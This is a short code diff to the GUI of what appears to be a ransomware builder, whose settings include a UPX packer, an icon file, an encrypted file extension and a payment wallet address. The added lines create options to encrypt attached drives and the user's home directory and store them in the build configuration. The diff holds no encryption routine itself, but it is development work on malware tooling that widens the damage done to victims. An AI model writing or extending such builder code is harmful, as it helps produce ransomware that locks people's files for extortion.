@@ -112,6 +112,18 @@ class Gui(MainFrame):
             self.UpxDirPicker.SetPath(config_dict["upx_dir"])
         else:
             self.UpxDirPicker.SetPath("")
+        # Encrypt Attached Drives
+        if "encrypt_attached_drives" in config_dict:
+            if config_dict["encrypt_attached_drives"]:
+                self.EncryptAttachedDrivesCheckbox.SetValue(True)
+            else:
+                self.EncryptAttachedDrivesCheckbox.SetValue(False)
+        # Encrypt User Home
+        if "encrypt_user_home" in config_dict:
+            if config_dict["encrypt_user_home"]:
+                self.EncryptUserHomeCheckbox.SetValue(True)
+            else:
+                self.EncryptUserHomeCheckbox.SetValue(False)
         # Encrypted File Extension
         if "encrypted_file_extension" in config_dict:
             self.EncryptedFileExtensionTextCtrl.SetValue(config_dict["encrypted_file_extension"])
@@ -353,6 +365,10 @@ class Gui(MainFrame):
         user_input_dict["icon_file"] = self.IconFilePicker.GetPath()
         # UPX Packer Dir
         user_input_dict["upx_dir"] = self.UpxDirPicker.GetPath()
+        # Encrypt Attached Drives
+        user_input_dict["encrypt_attached_drives"] = self.EncryptAttachedDrivesCheckbox.IsChecked()
+        # Encrypt User Home
+        user_input_dict["encrypt_user_home"] = self.EncryptUserHomeCheckbox.IsChecked()
         # Encrypted File Extension
         user_input_dict["encrypted_file_extension"] = self.EncryptedFileExtensionTextCtrl.GetValue()
         # Wallet Address
